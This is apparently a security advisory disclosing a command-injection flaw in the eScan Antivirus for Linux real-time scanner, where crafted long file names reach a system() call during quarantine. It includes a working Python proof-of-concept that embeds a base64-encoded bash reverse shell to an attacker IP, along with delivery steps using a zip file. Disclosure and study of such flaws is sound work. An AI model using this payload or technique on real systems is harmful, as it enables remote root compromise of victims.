# Description and Impact
Escan Antivirus for Linux has real-time protection program `rtscanner` run as system service. This program has a OS Command injection vulnerability in quarantine file mechanism. An attacker can send crafted file and gain remote code execution with highest privilege as soon as crafted file writes into victim's disk.

**Researchers**:
- Nông Hoàng Tú <tunh19@fpt.com>
- Ngô Thu Hồng <hongnt53@fpt.com>

# Root-cause
1. `rtscanner` failed to quarantine a file that has name **>= 253** characters (max file name's length on Linux is 255). This program uses command `mv` to move file to quarantine folder.
2. `rtscanner` uses dangerous function `system` with unsanitized data.

![image_2025-01-18_11-08-53](https://github.com/user-attachments/assets/616d5977-31dd-4668-8ff1-478fde87d53e)


3. By default, `/tmp/` and `/home/` are being monitored

![image_2025-01-18_11-08-53 (2)](https://github.com/user-attachments/assets/32487a13-d54b-4cf1-8dd4-6b699b5a636f)


An attacker can send any malicious file with crafted file name. As soon as crafted file writes into these folders, quarantine mechanism executes and malicious code command is executed with system's privilege.

In demotration bellow, I sent compressed file that contains malicious file to victim's machine. By default, compressed files are not being scanned by real-time scanner. Malicious code executes as soon as user uncompress downloaded file.

![image_2025-01-18_11-08-53 (3)](https://github.com/user-attachments/assets/a824dc12-9007-40b3-aa92-f0c374f8aa7a)

*Important notes*:
- When decompress using `Extract here` feature, program `engrampa` extracts internal file into a folder if there's no folder. The format will be `<name of compressed file> <suffix>` where suffix is a number, like `(2)`, `(3)`. Meanwhile real-time scanner adds folder `<name of compressed file>` to **inotify**'s watch list. This is a logic bug in scanner's logic. Therefore, compressed file delivered to victim must contains internal folder that has the same name with zip file.
- Demotration shows malicious code execution when file is decompressed. In other attack scenarios, malicious code might be executed *as soon as crafted file is written into victim's system* without user's interactions.
- Servers that has file upload feature and eScan for Linux (configured to monitor uploaded files) are under great danger.

# Proof-of-concept
1. Create crafted file that executes bash redirection to make reverse shell. Python script:

```
MAX_LEN=253

# Payload to trigger reverse shell
# bash -c 'exec bash -i &>/dev/tcp/192.168.58.192/8888 <&1'
PAYLOAD=";echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC41OC4xOTIvODg4OCA8JjEnCg==|base64 -d|sh"
PREFIX="AA AA" # Doesn't really required. But it looks a little better
SUFFIX=" # "
CHUNK="A" * (MAX_LEN - len(PREFIX) - len(PAYLOAD) - len(SUFFIX))
NAME=PREFIX + PAYLOAD + SUFFIX + CHUNK

print("DEBUG: created file with len", len(NAME))

# Content to trigger quarantine action
CONTENT="X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

with open("/tmp/" + NAME, "w") as f:
    f.write(CONTENT)
```

2. Create compressed zip file that contain crafted file and move it to web server.

![image_2025-01-18_11-08-53 (4)](https://github.com/user-attachments/assets/0b9913a1-6aed-4038-a6fc-dbc63584c3ae)

![image_2025-01-18_11-08-53 (5)](https://github.com/user-attachments/assets/8e4aeb59-6a4c-4bdb-b4f5-10044a3ed383)


Attacker creates a listener and wait victim's download malicious file.

![image_2025-01-18_11-08-53 (6)](https://github.com/user-attachments/assets/02f103a8-3af4-412b-bccd-7daf825b9617)

3. Victim downloads zip file then extract

![image_2025-01-18_11-08-53 (7)](https://github.com/user-attachments/assets/30af1e4f-b7fa-4957-9224-0f4cb984b497)

![image_2025-01-18_11-08-53 (8)](https://github.com/user-attachments/assets/f7d942b0-ce28-4c72-9171-d5fd372b593d)


4. Attacker gains remote code execution

![image_2025-01-18_11-08-53 (9)](https://github.com/user-attachments/assets/25db100b-906b-4b5c-a1cb-1d3247b01893)

![image_2025-01-18_11-08-53 (10)](https://github.com/user-attachments/assets/5f63a189-b819-4119-a87a-98e625762f3d)


*Important note*: If crafted file is quarantined, change `MAX_LEN` in python script to 255.
